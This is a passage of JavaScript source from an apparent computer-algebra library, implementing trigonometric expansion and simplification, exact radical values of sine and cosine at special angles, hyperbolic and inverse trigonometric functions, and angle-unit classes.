  }
  if (u instanceof Expression.GF2Value) {
    return u;
  }
  if (u instanceof Expression.NthRoot) {
    return f(u);
  }
  if (u instanceof Expression.Negation) {
    return u;//?
  }
  if (u instanceof Expression.Complex) {
    return u;//?
  }
  if (u instanceof Expression.NonSimplifiedExpression) {
    //TODO: fix
    return u;//?
  }
  if (u instanceof Expression.Degrees) {
    return u;//?
  }
  if (u instanceof Expression.Radians) {
    return u;//?
  }
  if (u instanceof Expression.Symbol) {
    return f(u);//?
  }
  if (u instanceof Expression.Arctan) {
    return f(map(f, u.a).arctan());
  }
  if (u instanceof Expression.Logarithm) {
    return f(map(f, u.a).logarithm());
  }
  if (u instanceof Expression.Determinant) {
    return f(map(f, u.a).determinant());
  }
  if (u instanceof Expression.Inequality) {
    return f(map(f, u.a).transformInequality(map(f, u.b), u.sign));
  }
  if (u instanceof Expression.ComplexConjugate) {
    return f(map(f, u.a).complexConjugate());
  }
  if (u instanceof Expression.Abs) {
    return f(map(f, u.a).abs());
  }
  throw new TypeError();
};

Expression._map = map;

// page 303

var expandTrigonometryRulesInternal = function (a, b, type) {
  if (type === "cos") {
    // cos(a + b) = cos(a) * cos(b) - sin(a) * sin(b)
    return expandTrigonometryRules(a, "cos").multiply(expandTrigonometryRules(b, "cos")).subtract(expandTrigonometryRules(a, "sin").multiply(expandTrigonometryRules(b, "sin")));
  }
  if (type === "sin") {
    // sin(a + b) = sin(a) * cos(b) + cos(a) * sin(b)
    return expandTrigonometryRules(a, "sin").multiply(expandTrigonometryRules(b, "cos")).add(expandTrigonometryRules(a, "cos").multiply(expandTrigonometryRules(b, "sin")));
  }
  throw new TypeError(type);
};

var expandTrigonometryRules = function (A, type) {
  if (A instanceof Addition) {
    return expandTrigonometryRulesInternal(A.a, A.b, type);
  } else if (A instanceof Multiplication) {
    var i = Expression.ONE;
    for (var iteratory = A.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
      if (y instanceof Expression.Integer) {
        i = i.multiply(y);
      }
    }
    var a = i;
    var b = A.divide(i);
    //var a = A.a;
    //var b = A.b;
    if (!(a instanceof Integer)) {
      throw new TypeError();
    }
    if (a.equals(Expression.ONE)) {
      if (type === "cos") {
        return A.cos();
      }
      if (type === "sin") {
        return A.sin();
      }
    }
    if (a.compareTo(Expression.ONE.negate()) === 0) {
      if (type === "cos") {
        return expandTrigonometryRules(b, type);
      }
      if (type === "sin") {
        return expandTrigonometryRules(b, type).negate();
      }
    }
    var c = a.compareTo(Expression.ZERO) > 0 ? Expression.ONE : Expression.ONE.negate();
    return expandTrigonometryRulesInternal(c.multiply(b), a.subtract(c).multiply(b), type);
  } else if (A instanceof Division) {
    var t = simplifyConstantValue(A, type);
    if (t != null) {
      return t;
    }
    var a = A.a;
    var b = A.b;
    if (a instanceof Addition) {
      return expandTrigonometryRulesInternal(a.a.divide(b), a.b.divide(b), type);
    }
  }
  if (A instanceof Expression.Symbol ||
      A instanceof Expression.Exponentiation && A.a instanceof Expression.Symbol && Expression.isScalar(A.a) && A.b instanceof Expression.Integer && A.b.compareTo(Expression.ONE) > 0 || // TODO: ?
      A instanceof Expression.Degrees ||
      A instanceof Expression.Radians ||
      A instanceof Expression.Complex ||
      A instanceof Expression.Arctan) {
    if (type === "cos") {
      return A.cos();
    }
    if (type === "sin") {
      return A.sin();
    }
  }
  throw new TypeError();
};

// CA and SC, EA, p. 303

var expandTrigonometry = function (u) {
  return map(function (v) {
    if (v instanceof Sin) {
      return expandTrigonometryRules(v.a, "sin");
    }
    if (v instanceof Cos) {
      return expandTrigonometryRules(v.a, "cos");
    }
    return v;
  }, u);
};

Expression._expandTrigonometry = expandTrigonometry;//!

var contractTrigonometry = function (u) {
  return map(function (v) {
    if (v instanceof Multiplication || v instanceof Exponentiation || v instanceof Addition) {//! Addition - ?
      return contractTrigonometryRules(v);
    }
    if (v instanceof Division) {
      return contractTrigonometryRules(v.getNumerator()).divide(v.getDenominator());
    }
    return v;
  }, u);
};

// page 323

var hasTrigonometry = function (e) {//TODO: remove
  if (e instanceof BinaryOperation) {
    return hasTrigonometry(e.a) || hasTrigonometry(e.b);
  }
  return e instanceof Cos || e instanceof Sin;
};

var simplifyTrigonometry = function (u) {
  if (!hasTrigonometry(u)) {
    return u;
  }
  //!new
  var v = null;
  var r = null;
  Expression._map(function (e) {
    // sin(x/2) -> sin(t), t = 2x
    if (e instanceof Expression.Sin || e instanceof Expression.Cos) {
      var a = e.a;
      if (a instanceof Division) {
        var n = a.getNumerator();
        var d = a.getDenominator();
        if (!d.equals(Expression.ONE)) {
          for (var iteratorx = n.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
            var g = x.gcd(d);
            if (!g.equals(d)) {
              for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
                if (y instanceof Expression.Symbol && y !== Expression.PI) {
                  r = d.divide(g);
                  v = y;
                }
              }
            }
          }
        }
      }
    }
    return e;
  }, u);
  if (v != null && r != null) {
    // sin(x/2) -> sin(x)
    u = Expression._substitute(u, v, v.multiply(r), v.divide(r));
    u = simplifyTrigonometry(u);
    // sin(x) -> sin(x/2)
    u = Expression._substitute(u, v, v.divide(r), v.multiply(r));
    return u;
  }

  //!
  // TODO: https://en.wikipedia.org/wiki/Euler%27s_formula#Relationship_to_trigonometry - is it possible to do this with anoher method?
  var n = u.getNumerator();
  n = expandTrigonometry(n);
  n = contractTrigonometry(n);
  var d = u.getDenominator();
  d = expandTrigonometry(d);
  d = contractTrigonometry(d);
  return n.divide(d);
};

Expression.Division.prototype.compare4Multiplication = function (y) {
  if (y instanceof Division) {
    return this.a.compare4Multiplication(y.a) || this.b.compare4Multiplication(y.b);
  }
  return -1;//TODO:
};
Expression.Division.prototype.compare4MultiplicationSymbol = function () {
  return +1;//TODO:
};
Expression.Division.prototype.compare4MultiplicationInteger = function () {
  return +1;//TODO:
};
Expression.Division.prototype.compare4MultiplicationNthRoot = function () {
  return +1;//TODO:
};

Expression.simplifyTrigonometry = simplifyTrigonometry;//?


function Sin(x) {
  Expression.Function.call(this, "sin", x);
}
Sin.prototype = Object.create(Expression.Function.prototype);

//TODO: new 2017-04-26
var simplifyConstantValueInternal = function (d, fraction) {
  fraction = fraction || Expression.ZERO;
  if (d >= +360 || d <= -360) {
    throw new RangeError();
  }
  if (d < 0) {
    d = 0 - d;
    fraction = fraction.negate();
  }
  if (d >= 180) {
    d = d - 180;
    var tmp = simplifyConstantValueInternal(d, fraction);
    return tmp == null ? null : tmp.negate();
  }
  if (d > 90) {
    d = 0 - d;
    fraction = fraction.negate();
    d = d + 180;
    var tmp = simplifyConstantValueInternal(d, fraction);
    return tmp == null ? null : tmp.negate();
  }
  console.assert(d >= 0 && d <= 90);
  console.assert(fraction.getNumerator().abs().compareTo(fraction.getDenominator()) < 0);

  function f(x) {
    // https://en.wikipedia.org/wiki/Trigonometric_constants_expressed_in_real_radicals#Calculated_trigonometric_values_for_sine_and_cosine
    // cos(x) = sqrt(2+2cos(2x))/2 - sign - ?
    var y = simplifyConstantValueInternal(x * 2);
    return y == null ? null : Expression.TWO.add(Expression.TWO.multiply(y)).squareRoot().divide(Expression.TWO);
  }
  function cosapb(a, b) { // cos(d) = cos(a + b)
    var cosa = simplifyConstantValueInternal(a);
    var cosb = simplifyConstantValueInternal(b);
    var sina = simplifyConstantValueInternal(90 - a);
    var sinb = simplifyConstantValueInternal(90 - b);
    return cosa.multiply(cosb).subtract(sina.multiply(sinb));
  }

  function phi() {
    return Expression.ONE.add(Expression.TWO.add(Expression.TWO).add(Expression.ONE).squareRoot()).divide(Expression.TWO);
  }

  //function cos2x(d) { // cos(d) = cos(a + b)
    // cos(2x) = 2cos^2(x)-1
    //var y = simplifyConstantValueInternal(d / 2);
    //return Expression.TWO.multiply(y.multiply(y)).subtract(Expression.ONE);
  //}


  //if (d === 24) {
    // https://en.wikipedia.org/wiki/Trigonometric_constants_expressed_in_real_radicals#24Â°:_sum_12Â°_+_12Â°
    //return ExpressionParser.parse('(sqrt(6*(5-sqrt(5)))+sqrt(5)+1)/8');
    //return cosapb(60, -36);
  //}
  //if (d === 42) {
    // cos(42) = sin(48) = 2*sin(24)*cos(24)
    //return ExpressionParser.parse('2*sin(24)*cos(24)');
  //}

  // 0, 15, 30, 36, 45, 60, 72, 75, 90 - more simple

if (fraction.equals(Expression.ZERO)) {
  if (d === 0) {
    return Expression.ONE;
  }
  if (d === 30) {
    return Expression.ONE.add(Expression.TWO).squareRoot().divide(Expression.TWO);
  }
  if (d === 45) {
    return Expression.ONE.divide(Expression.TWO.squareRoot());
  }
  if (d === 60) {
    return Expression.ONE.divide(Expression.TWO);
  }
  if (d === 90) {
    return Expression.ZERO;
  }

  if (d === 15) {
    return f(d);
  }
  if (d === 75) {
    return f(d);
  }

  if (d === 36) {
    return phi().divide(Expression.TWO);
  }
  if (d === 72) {
    return phi().subtract(Expression.ONE).divide(Expression.TWO);
  }

  if (d === 18) {
    return Expression.TWO.add(phi()).squareRoot().divide(Expression.TWO);
  }
  // http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/simpleTrig.html#section4.2
  if (d === 54) {
    //return Expression.TWO.subtract(Expression.TWO.subtract(phi()).squareRoot()).squareRoot().divide(Expression.TWO);
    // https://www.cut-the-knot.org/pythagoras/cos36.shtml
    return Expression.TWO.add(Expression.ONE).subtract(phi()).squareRoot().divide(Expression.TWO);
  }

  // https://en.wikipedia.org/wiki/Sine


  //for (var d = 3; d <= 90; d += 3) {
  //  if (d % 15 !== 0 && d % 18 !== 0) {
  //    for (var a = 75; a > 0; a -= 15) {
  //      var b = -(a - d);
  //      if (b % 18 === 0) {
  //        console.log(`cos(${d})=cos(${a}+${b})`);
  //      }
  //    }
  //  }
  //}


  //if (d === 3) {
    // https://en.wikipedia.org/wiki/Trigonometric_constants_expressed_in_real_radicals#3Â°:_regular_hexacontagon_(60-sided_polygon)
    //return cosapb(18, -15);
  //}

  if (d % 3 === 0) {
    var a = 90 - (Math.floor(d / 3) % 6) * 15;
    var b = -(a - d);
    return cosapb(a, b);
  }
}

if (fraction.multiply(Expression.TWO).getDenominator().equals(Expression.ONE)) {
  var dd = d + fraction.multiply(Expression.TWO).toNumber() / 2;
  if (dd === 7.5) {
    return cosapb(30, -22.5);
  }
  if (dd === 22.5) {
    return f(dd);
  }
  if (dd === 37.5) {
    return cosapb(60, -22.5);
  }
  if (dd === 52.5) {
    return cosapb(30, +22.5);
  }
  if (dd === 67.5) {
    return f(dd);
  }
  if (dd === 82.5) {
    return cosapb(60, +22.5);
  }
}

  //TODO: sin(1.5)
  
  // https://math.stackexchange.com/questions/125774/how-to-expand-cos-nx-with-cos-x#answer-125826
  if (d % 1 === 0) {//TODO: !!!
    var rational = Integer.fromNumber(d).add(fraction).divide(Integer.fromNumber(60));
    //var n = 360 / Math.gcd(360, d);
    var n = rational.getDenominator().toNumber();
    var a = rational.getNumerator().toNumber();
    if (n > Number.MAX_SAFE_INTEGER || a > Number.MAX_SAFE_INTEGER) {
      return undefined;
    }
    var T = function (n) {
      // https://en.wikipedia.org/wiki/Chebyshev_polynomials#Definition
      var x = Polynomial.of(Expression.ZERO, Expression.ONE);
      var Tprevious = Polynomial.of(Expression.ONE);
      var Tcurrent = x;
      var i = 1;
      while (i < n) {
        var Tnext = Polynomial.of(Expression.TWO).multiply(x).multiply(Tcurrent).subtract(Tprevious);
        Tprevious = Tcurrent;
        Tcurrent = Tnext;
        i += 1;
      }
      return Tcurrent;
    };
    var polynomial = T(n).subtract(Polynomial.of(simplifyConstantValueInternal(60 * (a % 6), Expression.ZERO)));
    polynomial = polynomial.scale(polynomial.getContent().inverse());
    //TODO: ?
    var approximate = Math.cos((d + fraction.getNumerator().toNumber() / fraction.getDenominator().toNumber()) / 180 * Math.PI);
    var tmp = Math.floor(approximate * Math.pow(2, 24) + 0.5);
    var scale = Expression.Integer.fromNumber(Math.pow(2, 24));
    var interval = {a: Expression.Integer.fromNumber(tmp - 1).divide(scale), b: Expression.Integer.fromNumber(tmp + 1).divide(scale)};
    return Expression.ExpressionPolynomialRoot.create(polynomial, interval);
  }
  
  return undefined;
};

var simplifyConstantValue = function (x, type) {
  var a = undefined;
  var b = undefined;
  if (x instanceof Integer && x.compareTo(Expression.ZERO) === 0) {
    a = Expression.ZERO;
    b = Expression.ONE;
  } else if (x === Expression.PI) {
    a = Expression.ONE;
    b = Expression.ONE;
  } else if (x instanceof Multiplication && x.a instanceof Integer && x.b === Expression.PI) {
    a = x.a;
    b = Expression.ONE;
  } else if (x instanceof Division && x.b instanceof Integer && x.a === Expression.PI) {
    a = Expression.ONE;
    b = x.b;
  } else if (x instanceof Division && x.b instanceof Integer && x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b === Expression.PI) {
    a = x.a.a;
    b = x.b;
  } else if (x instanceof Expression.Degrees) {
    var t = x.value.simplify();
    t = t.multiply(Expression.PI).divide(Integer.fromNumber(180));
    if (type === 'sin') {
      return t.sin();
    }
    if (type === 'cos') {
      return t.cos();
    }
  }
  if (a != undefined && b != undefined) {
    //b = b.toNumber();
    //var k = Math.pow(2, 44);
    //if (b >= 1 && b <= 180 && (180 * k) % b === 0) {
      //var d = a.multiply(Integer.fromNumber(Math.floor((180 * k) / b))).remainder(Integer.fromNumber(360 * k)).toNumber();
      //d /= k;
      var integer = a.multiply(Integer.fromNumber(180)).truncatingDivide(b);
      var fraction = a.multiply(Integer.fromNumber(180)).subtract(integer.multiply(b)).divide(b);
      //var degrees = integer.remainder(Integer.fromNumber(360)).add(fraction);
      var d = integer.remainder(Integer.fromNumber(360)).toNumber();
      if (type === "sin") {
        d = 90 - d;
        fraction = fraction.negate();
        if (d >= 360 - 90) {
          d -= 360;
        }
      } else if (type !== "cos") {
        throw new TypeError();
      }
      return simplifyConstantValueInternal(d, fraction);
    //}
  }
  if (x instanceof Expression.Radians && x.value.equals(Expression.ZERO)) {
    return simplifyConstantValue(x.value, type);
  }
  if (Expression.has(x, Expression.Complex)) {
    if (type === "sin") {
      return Expression.I.multiply(x.divide(Expression.I).sinh());
    }
    if (type === "cos") {
      return x.divide(Expression.I).cosh();
    }
  }
  if (x instanceof Expression.Arctan) {
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("trigonometric-function-of-inverse-trigonometric-function-arg", new Expression.Matrix(Matrix.I(1))));
    }
    // https://www.rapidtables.com/math/trigonometry/arctan.html#rules
    // https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#Relationships_between_trigonometric_functions_and_inverse_trigonometric_functions
    //TODO: lin in details
    //TODO: test
    var a = x.a;
    if (type === "sin") {
      //TODO: fix (sign - ?), fix complex numbers - ?
      return a.getNumerator().divide(a.getDenominator()._pow(2).add(a.getNumerator()._pow(2)).squareRoot());
    }
    if (type === "cos") {
      //TODO: fix (sign - ?), fix complex numbers - ?
      return a.getDenominator().divide(a.getDenominator()._pow(2).add(a.getNumerator()._pow(2)).squareRoot());
    }
    //TODO:
  }
  if (x instanceof Expression.ExpressionWithPolynomialRoot) {
    return simplifyConstantValue(x.upgrade(), type);
  }
  return undefined;
};

Expression.prototype.cosh = function () {
  var a = this;
  return a.exp().add(a.negate().exp()).divide(Expression.TWO);
};

Expression.prototype.sinh = function () {
  var a = this;
  return a.exp().subtract(a.negate().exp()).divide(Expression.TWO);
};

Expression.prototype.tanh = function () {
  var a = this;
  return a.exp().subtract(a.negate().exp()).divide(a.exp().add(a.negate().exp()));
};

Expression.prototype.coth = function () {
  var a = this;
  return a.exp().add(a.negate().exp()).divide(a.exp().subtract(a.negate().exp()));
};

Expression.prototype.arccos = function () {
  var a = this;
  //return a.pow(Expression.TWO).subtract(Expression.ONE).negate().squareRoot().divide(a).arctan();
  return a.arcsin().subtract(Expression.PI.divide(Expression.TWO)).negate();
};

Expression.prototype.arcsin = function () {
  var a = this;
  // see https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#:~:text=Useful%20identities%20if%20one%20only%20has%20a%20fragment%20of%20a%20sine%20table:
  return a.divide(a.pow(Expression.TWO).subtract(Expression.ONE).negate().squareRoot()).arctan();
};

Expression.prototype.arccot = function () {
  var a = this;
  //TODO: details ?
  // see https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#:~:text=Useful%20identities%20if%20one%20only%20has%20a%20fragment%20of%20a%20sine%20table:
  return a.arctan().subtract(Expression.PI.divide(Expression.TWO)).negate();
};

Expression.prototype.arcosh = function () {
  var x = this;
  // https://en.wikipedia.org/wiki/Inverse_hyperbolic_functions#Inverse_hyperbolic_cosine
  return x.add(x.multiply(x).subtract(Expression.ONE).squareRoot()).logarithm();
};
Expression.prototype.arsinh = function () {
  var x = this;
  // https://en.wikipedia.org/wiki/Inverse_hyperbolic_functions#Inverse_hyperbolic_cosine
  return x.add(x.multiply(x).add(Expression.ONE).squareRoot()).logarithm();
};
Expression.prototype.artanh = function () {
  var x = this;
  // https://en.wikipedia.org/wiki/Inverse_hyperbolic_functions#Inverse_hyperbolic_tangent
  return x.add(Expression.ONE).divide(x.subtract(Expression.ONE).negate()).logarithm().divide(Expression.TWO);
};
Expression.prototype.arcoth = function () {
  var x = this;
  // https://en.wikipedia.org/wiki/Inverse_hyperbolic_functions#Inverse_hyperbolic_tangent
  return x.add(Expression.ONE).divide(x.subtract(Expression.ONE)).logarithm().divide(Expression.TWO);
};

Expression.isRealAlgebraicNumber = function isRealAlgebraicNumber(x) {
  return x instanceof Expression.Integer ||
         x instanceof Expression.NthRoot && typeof x.n === "number" && x.n % 1 === 0 && isRealAlgebraicNumber(x.a) && (x.n % 2 !== 0 || Expression._isPositive(x.a)) ||
         x instanceof Expression.Division && isRealAlgebraicNumber(x.getNumerator()) && isRealAlgebraicNumber(x.getDenominator()) ||
         x instanceof Expression.Addition && isRealAlgebraicNumber(x.a) && isRealAlgebraicNumber(x.b) ||
         x instanceof Expression.Multiplication && isRealAlgebraicNumber(x.a) && isRealAlgebraicNumber(x.b);
};

var isArgumentValid = function (x, type) {
  if (x instanceof Expression.Radians) {
    // https://ru.wikipedia.org/wiki/Ð¢Ñ€Ð°Ð½ÑÑ†ÐµÐ½Ð´ÐµÐ½Ñ‚Ð½Ð¾Ðµ_Ñ‡Ð¸ÑÐ»Ð¾#ÐŸÑ€Ð¸Ð¼ÐµÑ€Ñ‹_Ñ‚Ñ€Ð°Ð½ÑÑ†ÐµÐ½Ð´ÐµÐ½Ñ‚Ð½Ñ‹Ñ…_Ñ‡Ð¸ÑÐµÐ»
    return Expression.isRealAlgebraicNumber(x.value);
  }
  if (x instanceof Expression.Degrees) {
    return simplifyConstantValue(x, type) != undefined;
  }
  if (x instanceof Expression.Symbol) {
    return Expression.isScalar(x);
  }
  if (x instanceof Expression.Exponentiation) {
    //TODO: ?
    return x.a instanceof Expression.Symbol && Expression.isScalar(x.a) && x.b instanceof Expression.Integer && x.b.compareTo(Expression.ONE) > 0;
  }
  if (x instanceof Addition) {
    return isArgumentValid(x.a, type) && isArgumentValid(x.b, type);
  }
  if (x instanceof Expression.Arctan) {
    return true;//?
  }
  if (x instanceof Multiplication) {
    if (x.a instanceof Integer && Expression.isScalar(x.b) && x.b instanceof Expression.Symbol) {
      return true;
    }
    if (x.a instanceof Integer && Expression.isScalar(x.b) && x.b instanceof Expression.Arctan) {
      return true;
    }
    if (Expression.isScalar(x.b) && x.b instanceof Expression.Symbol) {
      if (x.a instanceof Expression.NthRoot && x.a.a instanceof Integer) {
        return true;
      }
      if (x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof Expression.NthRoot && x.a.b.a instanceof Integer) {
        return true;
      }
    }
    var c = Expression.getConstant(x);
    var t = x.divide(c);
    if (Expression.isScalar(x) &&
        (c instanceof Integer || c instanceof Expression.Complex) &&
        (t instanceof Multiplication || t instanceof Expression.Symbol || t instanceof Expression.Exponentiation)) {
      for (var iteratory = t.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (!(y instanceof Expression.NthRoot) &&
            !(y instanceof Expression.Symbol) &&
            !(y instanceof Expression.Exponentiation && y.a instanceof Expression.Symbol && Expression.isScalar(y.a) && y.b instanceof Expression.Integer && y.b.compareTo(Expression.ONE) > 0)) {
          return false;
        }
      }
      //TODO: is it correct ?
      return true;//!?
    }
  }
  if (x instanceof Division) {
    if (x.b instanceof Integer) {
      return isArgumentValid(x.a);
    }
  }
  if (x instanceof Expression.Complex) {
    return true;//?
  }
  return false;
};

Expression.prototype.sin = function () {
  var x = this;
  var t = simplifyConstantValue(x, "sin");
  if (t != undefined) {
    return t;
  }
  if (x.isNegative()) {
    return x.negate().sin().negate();
  }
  if (!isArgumentValid(x, "sin")) {
    throw new RangeError("NotSupportedError");
  }
  return new Sin(x);
};

function Cos(x) {
  Expression.Function.call(this, "cos", x);
}
Cos.prototype = Object.create(Expression.Function.prototype);

Expression.prototype.cos = function () {
  var x = this;
  var t = simplifyConstantValue(x, "cos");
  if (t != undefined) {
    return t;
  }
  if (x.isNegative()) {
    return x.negate().cos();
  }
  if (!isArgumentValid(x, "cos")) {
    throw new RangeError("NotSupportedError");
  }
  return new Cos(x);
};

Expression.simplifications.push(Expression.simplifyTrigonometry);

Expression.Sin = Sin;
Expression.Cos = Cos;

//Expression.Negation.prototype.compare4Multiplication = function (y) {
//TODO: fix, more tests
//  return new Expression.Multiplication(Expression.ONE.negate(), this.a).compare4Multiplication(y);
//};

Expression.Addition.prototype.compare4Addition = function (y) {
  // cos(a + b) + cos(a + b)
  var x = this;
  return Expression.Addition.compare4Addition(x, y);
};

Expression.Multiplication.prototype.compare4MultiplicationInteger = function (x) {
  return -1;
};

/*
Expression.MatrixSymbol.prototype.compare4MultiplicationExponentiation = function (x) {
  return -1;//?
};
*/

//!!!
Expression.Addition.prototype.compare4Multiplication = function (y) {
  if (y instanceof Integer) {
    return -1;
  }
  if (y instanceof Expression.MatrixSymbol) {
    return +1;
  }
  //TODO: fix

  var x = this;
  var i = x.summands();
  var j = y.summands();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Multiplication(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};

Expression.Addition.prototype.compare4MultiplicationSymbol = function (x) {
  return 0 - this.compare4Multiplication(x);
};

Expression.Addition.prototype.compare4MultiplicationInteger = function (x) {
  return +1;
};

Expression.Addition.compare4Addition = function (x, y) {
  var i = x.summands();
  var j = y.summands();
  var a = i.next().value;
  var b = j.next().value;
  while (a != null && b != null) {
    var c = a.compare4Addition(b);
    if (c !== 0) {
      return c;
    }
    a = i.next().value;
    b = j.next().value;
  }
  return a != null ? +1 : (b != null ? -1 : 0);
};

//!!!


// unit of measurement
Expression.Unit = function (value) {
  this.value = value;
};
Expression.Unit.prototype = Object.create(Expression.prototype);
Expression.Unit.prototype.toString = function (options) {
  var b = this.value;
  var fb = b instanceof Expression.Integer ? false : true;
  return (fb ? "(" : "") + b.toString(options) + (fb ? ")" : "") + this.unitSymbol();
};
Expression.Unit.prototype.equals = function (y) {
  return y instanceof Expression.Unit && this.unitSymbol() === y.unitSymbol() && this.value.equals(y.value);
};
Expression.Unit.prototype.compare4AdditionSymbol = function (x) {
  //return -1;
  return x.compare4Addition(this.value);
};
Expression.Unit.prototype.compare4Addition = function (y) {
  return this.value.compare4Addition(y instanceof Expression.Unit && this.unitSymbol() === y.unitSymbol() ? y.value : y);
};
Expression.Unit.prototype.compare4Multiplication = function (y) {
  return this.value.compare4Multiplication(y instanceof Expression.Unit && this.unitSymbol() === y.unitSymbol() ? y.value : y);
};
Expression.Unit.prototype.compare4MultiplicationSymbol = function (x) {
  return x.compare4Multiplication(this.value);
};
Expression.Unit.prototype.compare4MultiplicationInteger = function (x) {
  return +1;
};
Expression.Unit.prototype.negate = function () {
  return this.create(this.value.negate());
};
Expression.Unit.prototype.multiply = function (y) {
  return this.create(this.value.multiply(y));
};
Expression.Unit.prototype.multiplyInteger = function (x) {
  return this.create(x.multiply(this.value));
};

Expression.Unit.prototype.add = function (y) {
  if (y instanceof Expression.Unit && this.unitSymbol() === y.unitSymbol()) {
    var x = this.value.add(y.value);
    if (x.equals(Expression.ZERO)) {
      return x;//!?
    }
    return this.create(x);//!?
  }
  return Expression.prototype.add.call(this, y);
};


//!new 2017-04-26
Expression.Degrees = function (value) {
  Expression.Unit.call(this, value);
};
Expression.Degrees.prototype = Object.create(Expression.Unit.prototype);
Expression.Degrees.prototype.unitSymbol = function () {
  return "\u00B0";
};
Expression.Degrees.prototype.create = function (value) {
  return new Expression.Degrees(value);
};

//!new 2019-12-27
Expression.Radians = function (value) {
  this.value = value;
};
Expression.Radians.prototype = Object.create(Expression.Unit.prototype);
Expression.Radians.prototype.unitSymbol = function () {
  return " rad";
};
Expression.Radians.prototype.create = function (value) {
  return new Expression.Radians(value);
};


//!new 2019-11-23
// https://en.wikipedia.org/wiki/Trigonometric_functions_of_matrices#cite_note-3
Expression.Matrix.prototype.sin = function () {
  var X = this;
  var i = Expression.I;
  var TWO = Expression.TWO;
  return i.multiply(X).exp().subtract(i.negate().multiply(X).exp()).divide(TWO.multiply(i));
};
Expression.Matrix.prototype.cos = function () {
  var X = this;
  var i = Expression.I;
  var TWO = Expression.TWO;
  return i.multiply(X).exp().add(i.negate().multiply(X).exp()).divide(TWO);
};



//!
(function () {
  var i = new Expression.Symbol('_i');
  function replaceSinCos(e) {
    return Expression._map(function (x) {
      if (x instanceof Expression.Sin) {
        var a = x.a;
        // Euler's formula
        return i.multiply(a).exp().subtract(i.multiply(a).negate().exp()).divide(Expression.TWO.multiply(Expression.I));
      }
      if (x instanceof Expression.Cos) {
        var a = x.a;
        // Euler's formula
        return i.multiply(a).exp().add(i.multiply(a).negate().exp()).divide(Expression.TWO);
      }
      return x;
    }, e);
  }
  function replaceBySinCos(e) {
    return Expression._map(function (x) {
      if (x instanceof Expression.Exponentiation && x.a === Expression.E) {
        var b = x.b;
        //var p = Polynomial.toPolynomial(b, i);
        var p = Polynomial.toPolynomial(b.getNumerator(), i).scale(b.getDenominator().inverse()); // as denominator may be not equal 1 and Polynomial.toPolynomial throws in that case
        if (p.getDegree() === 1) {
          var q = p.getCoefficient(0);
          var w = p.getCoefficient(1);
          // Euler's formula
          return w.cos().add(Expression.I.multiply(w.sin())).multiply(q.exp());
        }
        if (p.getDegree() > 1) {
          throw new TypeError("!?");
        }
      }
      return x;
    }, e);
  }

  Expression._replaceSinCos = replaceSinCos;
  Expression._replaceBySinCos = replaceBySinCos;
}());

// Arctangent
function Arctan(x) {
  Expression.Function.call(this, "arctan", x);
}
Arctan.prototype = Object.create(Expression.Function.prototype);
Expression.Arctan = Arctan;

// https://en.wikipedia.org/wiki/Continued_fraction#Infinite_continued_fractions_and_convergents
// https://stackoverflow.com/a/14011299/839199
function getlowestfraction(x0) {
    var eps = 1.0E-15;
    var h, h1, h2, k, k1, k2, a, x;

    x = x0;
    a = Math.floor(x);
    h1 = 1;
    k1 = 0;
    h = a;
    k = 1;

    while (x-a > eps*k*k) {
        x = 1/(x-a);
        a = Math.floor(x);
        h2 = h1; h1 = h;
        k2 = k1; k1 = k;
        h = h2 + a*h1;
        k = k2 + a*k1;
    }

    return h + "/" + k;
}

Expression.prototype.arctan = function () {
  var x = this;
  if (x.isNegative()) {
    return x.negate().arctan().negate();
  }
  if (Expression.isConstant(x) && !(x instanceof Expression.Logarithm)) {
    var value = Number(toDecimalStringInternal(x, {fractionDigits: 15}));
    console.assert(!Number.isNaN(value));
    var tmp = getlowestfraction(Math.atan(value) / Math.PI).split("/");
    var guess = Expression.Integer.fromNumber(Number(tmp[0])).divide(Expression.Integer.fromNumber(tmp[1])).multiply(Expression.PI);
    if (guess.getDenominator().toNumber() < 10000 && guess.tan().subtract(x).equals(Expression.ZERO)) {
      return guess;
    }
    throw new RangeError("NotSupportedError");
  }
  if (x instanceof Division) {
    var n = x.getNumerator();
    var d = x.getDenominator();
    if (d.subtract(Expression.ONE).subtract(n).multiply(d.subtract(Expression.ONE).add(n)).subtract(Expression.ONE).equals(Expression.ZERO)) {
      var y = Expression.TWO.multiply(x).divide(Expression.ONE.subtract(x._pow(2)));
      return (new Arctan(y)).divide(Expression.TWO);
    }
  }
  if (x instanceof Expression.Matrix) {
    if (x.matrix.isDiagonal()) {
      return new Expression.Matrix(x.matrix.map(function (e, i, j) {
        return i === j ? e.arctan() : Expression.ZERO;
      }));
    }
    // https://math.stackexchange.com/questions/2077674/what-is-the-alternate-form-of-arcsin-x
    // y = arctan(x)
    // tan(y) = x
    // -i*(e**(iy)-e**(-iy))/(e**(iy)+e**(-iy)) = x
    // y = ln((i-x)/(i+x))/(2i)
    // y = (ln((i-x)/(i+x)/i)+ln(i))/(2i)
    //TODO: details (a link or a formula - ?)
    var b = Expression.I.subtract(x).divide(Expression.I.add(x)).matrix;
    //var tmp = Expression.getFormaDeJordan(b, Expression.getEigenvalues(b));
    //var J = tmp.J;
    var c = b.map(function (e, i, j) {
      return i === j ? e : Expression.ZERO;
    });
    //c = tmp.P.multiply(c).multiply(tmp.P_INVERSED);
    var complexLogarithm = function (e) {
      if (e instanceof Division) {
        return complexLogarithm(e.a).subtract(e.b.logarithm());
      }
      var c = Expression.getComplexNumberParts(e);
      if (c != undefined && !c.imaginary.equals(Expression.ZERO)) {
        var real = c.real;
        var imaginary = c.imaginary;
        var phi = real.equals(Expression.ZERO) ? Expression.PI.divide(Expression.TWO) : imaginary.divide(real).arctan();
        if (real.isNegative()) {//?
          phi = phi.add(Expression.PI);
        }
